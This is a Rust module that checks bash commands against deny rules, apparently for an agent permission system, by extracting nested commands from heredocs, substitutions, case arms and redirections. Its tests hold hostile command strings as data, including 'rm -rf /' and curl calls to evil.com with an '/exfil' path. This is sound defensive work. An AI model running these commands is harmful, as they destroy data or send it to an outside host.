use super::bash_allow::bash_single_command_candidate_matches_rule;
use super::bash_stdin::{
    bash_crontab_stdin_here_string_command_bodies, bash_crontab_stdin_heredoc_command_bodies,
    bash_shell_stdin_here_string_bodies, bash_shell_stdin_heredoc_bodies, scan_bash_heredocs,
};
use super::{
    analyze_bash_command, bash_argv_command_bodies, bash_shell_command_string_bodies,
    bash_word_width, is_bash_env_assignment, nested_bash_command_candidates, tokenize_bash_words,
};

pub(super) fn bash_command_matches_deny_rule(command: &str, pattern: &str) -> bool {
    bash_deny_rule_command_candidates(command)
        .iter()
        .any(|candidate| bash_single_command_candidate_matches_rule(candidate, pattern, true))
}

fn bash_deny_rule_command_candidates(command: &str) -> Vec<String> {
    let mut candidates = Vec::new();
    push_bash_deny_rule_command_candidate(command, &mut candidates);

    let heredoc_scan = scan_bash_heredocs(command);
    let analysis = analyze_bash_command(&heredoc_scan.command_without_heredoc_bodies);
    for subcommand in analysis.subcommands {
        push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
    }

    for shell_body in bash_shell_command_string_bodies(&heredoc_scan.command_without_heredoc_bodies)
    {
        push_bash_deny_rule_command_candidate(&shell_body, &mut candidates);
        let shell_body_analysis = analyze_bash_command(&shell_body);
        for subcommand in shell_body_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
        for nested in nested_bash_command_candidates(&shell_body) {
            push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        }
    }

    for argv_body in bash_argv_command_bodies(&heredoc_scan.command_without_heredoc_bodies) {
        push_bash_deny_rule_command_candidate(&argv_body, &mut candidates);
        let argv_body_analysis = analyze_bash_command(&argv_body);
        for subcommand in argv_body_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
        for nested in nested_bash_command_candidates(&argv_body) {
            push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        }
    }

    for nested in nested_bash_command_candidates(&heredoc_scan.command_without_heredoc_bodies) {
        push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        let nested_analysis = analyze_bash_command(&nested);
        for subcommand in nested_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
    }

    for nested in heredoc_scan
        .unquoted_heredoc_bodies
        .iter()
        .flat_map(|body| nested_bash_command_candidates(body))
    {
        push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        let nested_analysis = analyze_bash_command(&nested);
        for subcommand in nested_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
    }

    for shell_body in bash_shell_stdin_heredoc_bodies(command) {
        push_bash_deny_rule_command_candidate(&shell_body, &mut candidates);
        let shell_body_analysis = analyze_bash_command(&shell_body);
        for subcommand in shell_body_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
        for nested in nested_bash_command_candidates(&shell_body) {
            push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        }
    }

    for shell_body in bash_shell_stdin_here_string_bodies(command) {
        push_bash_deny_rule_command_candidate(&shell_body, &mut candidates);
        let shell_body_analysis = analyze_bash_command(&shell_body);
        for subcommand in shell_body_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
        for nested in nested_bash_command_candidates(&shell_body) {
            push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        }
    }

    for cron_command in bash_crontab_stdin_heredoc_command_bodies(command)
        .into_iter()
        .chain(bash_crontab_stdin_here_string_command_bodies(command))
    {
        push_bash_deny_rule_command_candidate(&cron_command, &mut candidates);
        let cron_analysis = analyze_bash_command(&cron_command);
        for subcommand in cron_analysis.subcommands {
            push_bash_deny_rule_command_candidate(&subcommand, &mut candidates);
        }
        for nested in nested_bash_command_candidates(&cron_command) {
            push_bash_deny_rule_command_candidate(&nested, &mut candidates);
        }
    }

    candidates
}

fn push_bash_deny_rule_command_candidate(command: &str, candidates: &mut Vec<String>) {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return;
    }
    push_unique_bash_deny_candidate(trimmed, candidates);

    if let Some(stripped) = strip_bash_negation(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(stripped) = strip_bash_control_keyword(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(stripped) = strip_bash_case_statement_prefix(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(stripped) = strip_bash_case_arm_pattern(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(stripped) = strip_bash_leading_redirections(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(stripped) = strip_bash_leading_env_assignments_and_redirections(trimmed) {
        push_bash_deny_rule_command_candidate(stripped, candidates);
    }
    if let Some(unwrapped) = unwrap_bash_group_candidate(trimmed) {
        push_bash_deny_rule_command_candidate(unwrapped, candidates);
    }
}

fn push_unique_bash_deny_candidate(command: &str, candidates: &mut Vec<String>) {
    let candidate = command.trim().to_string();
    if !candidate.is_empty() && !candidates.iter().any(|existing| existing == &candidate) {
        candidates.push(candidate);
    }
}

fn strip_bash_negation(command: &str) -> Option<&str> {
    command
        .strip_prefix('!')
        .map(str::trim_start)
        .filter(|stripped| !stripped.is_empty())
}

fn strip_bash_control_keyword(command: &str) -> Option<&str> {
    let (keyword, rest) = command.split_once(char::is_whitespace)?;
    if matches!(
        keyword,
        "if" | "then" | "elif" | "else" | "while" | "until" | "do"
    ) {
        Some(rest.trim_start()).filter(|stripped| !stripped.is_empty())
    } else {
        None
    }
}

fn strip_bash_case_arm_pattern(command: &str) -> Option<&str> {
    let first_line = command.split_once('\n').map_or(command, |(line, _)| line);
    if !first_line.contains(')') {
        return None;
    }
    super::bash_ast::case_arm_body_start(command)
        .and_then(|start| command.get(start..))
        .map(str::trim_start)
        .filter(|stripped| !stripped.is_empty())
}

fn strip_bash_case_statement_prefix(command: &str) -> Option<&str> {
    if !command.starts_with("case ") {
        return None;
    }
    command
        .split_once(" in ")
        .and_then(|(_, rest)| strip_bash_case_arm_pattern(rest).or(Some(rest)))
        .map(str::trim_start)
        .filter(|stripped| !stripped.is_empty())
}

fn strip_bash_leading_redirections(command: &str) -> Option<&str> {
    let mut index = 0usize;
    let mut stripped_any = false;

    while let Some(rest) = command.get(index..) {
        let whitespace_width = rest
            .chars()
            .take_while(|character| character.is_whitespace())
            .map(char::len_utf8)
            .sum::<usize>();
        index += whitespace_width;
        let Some(width) = command
            .get(index..)
            .and_then(leading_bash_redirection_width)
        else {
            break;
        };
        index += width;
        stripped_any = true;
    }

    if stripped_any {
        command
            .get(index..)
            .map(str::trim_start)
            .filter(|stripped| !stripped.is_empty())
    } else {
        None
    }
}

fn strip_bash_leading_env_assignments_and_redirections(command: &str) -> Option<&str> {
    let mut index = 0usize;
    let mut stripped_redirection = false;

    while let Some(rest) = command.get(index..) {
        let whitespace_width = rest
            .chars()
            .take_while(|character| character.is_whitespace())
            .map(char::len_utf8)
            .sum::<usize>();
        index += whitespace_width;

        let Some(rest) = command.get(index..) else {
            break;
        };
        if let Some(width) = leading_bash_redirection_width(rest) {
            index += width;
            stripped_redirection = true;
        } else if let Some(width) = leading_bash_env_assignment_width(rest) {
            index += width;
        } else {
            break;
        }
    }

    if stripped_redirection {
        command
            .get(index..)
            .map(str::trim_start)
            .filter(|stripped| !stripped.is_empty())
    } else {
        None
    }
}

fn leading_bash_env_assignment_width(command: &str) -> Option<usize> {
    let width = bash_word_width(command)?;
    let word = command.get(..width)?;
    let tokens = tokenize_bash_words(word)?;
    matches!(tokens.as_slice(), [token] if is_bash_env_assignment(token, true)).then_some(width)
}

fn leading_bash_redirection_width(command: &str) -> Option<usize> {
    let operator_start = bash_redirection_operator_start(command)?;
    let operator_width = bash_redirection_operator_width(command.get(operator_start..)?)?;
    let target_start = operator_start + operator_width;
    if command.get(operator_start..)?.starts_with("<<") {
        return None;
    }

    if let Some(after_operator) = command.get(target_start..)
        && after_operator
            .chars()
            .next()
            .is_some_and(char::is_whitespace)
    {
        let whitespace_width = after_operator
            .chars()
            .take_while(|character| character.is_whitespace())
            .map(char::len_utf8)
            .sum::<usize>();
        let target = target_start + whitespace_width;
        return bash_word_width(command.get(target..)?).map(|width| target + width);
    }

    bash_word_width(command.get(target_start..)?).map(|width| target_start + width)
}

fn bash_redirection_operator_start(command: &str) -> Option<usize> {
    if command.starts_with("&>") {
        return Some(0);
    }
    let digit_width = command
        .chars()
        .take_while(char::is_ascii_digit)
        .map(char::len_utf8)
        .sum::<usize>();
    let rest = command.get(digit_width..)?;
    (rest.starts_with('<') || rest.starts_with('>')).then_some(digit_width)
}

fn bash_redirection_operator_width(command: &str) -> Option<usize> {
    for operator in ["&>>", "&>", ">>", "<>", ">|", "<&", ">&", "<", ">"] {
        if command.starts_with(operator) {
            return Some(operator.len());
        }
    }
    None
}

fn unwrap_bash_group_candidate(command: &str) -> Option<&str> {
    if command.len() < 2 {
        return None;
    }

    if command.starts_with('(') && command.ends_with(')') {
        return command
            .get(1..command.len().saturating_sub(1))
            .map(str::trim)
            .filter(|stripped| !stripped.is_empty());
    }

    if command.starts_with('{') && command.ends_with('}') {
        return command
            .get(1..command.len().saturating_sub(1))
            .map(|inner| inner.trim().trim_end_matches(';').trim())
            .filter(|stripped| !stripped.is_empty());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::bash_command_matches_deny_rule;

    #[test]
    fn literal_heredoc_body_does_not_match_deny_rule() {
        let literal = "cat <<EOF\nrm -rf /tmp/example\nEOF";
        assert!(!bash_command_matches_deny_rule(literal, "rm:*"));
        assert!(bash_command_matches_deny_rule(
            "cat <<EOF\n$(rm -rf /tmp/example)\nEOF",
            "rm:*"
        ));
        assert!(!bash_command_matches_deny_rule(
            "cat <<'EOF'\n$(rm -rf /tmp/example)\nEOF",
            "rm:*"
        ));
    }

    #[test]
    fn quoted_heredoc_blocks_deny_scan_of_nested_commands() {
        assert!(!bash_command_matches_deny_rule(
            "cat <<'EOF'\n$(dangerous --payload)\nEOF",
            "dangerous:*"
        ));
        assert!(!bash_command_matches_deny_rule(
            "cat <<\"EOF\"\n$(rm -rf /)\nEOF",
            "rm:*"
        ));
    }

    #[test]
    fn unquoted_heredoc_exposes_nested_command_substitution_to_deny() {
        assert!(bash_command_matches_deny_rule(
            "cat <<EOF\n$(rm -rf /critical)\nEOF",
            "rm:*"
        ));
        assert!(bash_command_matches_deny_rule(
            "cat <<EOF\n`curl http://evil.com`\nEOF",
            "curl:*"
        ));
    }

    #[test]
    fn process_substitution_exposes_inner_command_to_deny() {
        assert!(bash_command_matches_deny_rule(
            "diff <(rm -rf /tmp/secrets) /dev/null",
            "rm:*"
        ));
        assert!(bash_command_matches_deny_rule(
            "cat >(curl http://evil.com/exfil)",
            "curl:*"
        ));
        assert!(!bash_command_matches_deny_rule(
            "diff <(ls /tmp) /dev/null",
            "rm:*"
        ));
    }

    #[test]
    fn arithmetic_expansion_exposes_nested_substitution_to_deny() {
        assert!(bash_command_matches_deny_rule(
            "echo $((1 + $(rm -rf /)))",
            "rm:*"
        ));
    }

    #[test]
    fn ansi_c_quoting_content_visible_to_deny_matcher() {
        assert!(bash_command_matches_deny_rule(
            r"rm $'hello\nworld'",
            "rm:*"
        ));
        assert!(bash_command_matches_deny_rule(
            r"rm -rf $'/tmp/evil\tpath'",
            "rm:*"
        ));
    }

    #[test]
    fn case_arm_body_matches_deny_rule() {
        let command = r#"case "$target" in danger) rm -rf /tmp/example ;; *) echo ok ;; esac"#;
        assert!(bash_command_matches_deny_rule(command, "rm:*"));
    }
}
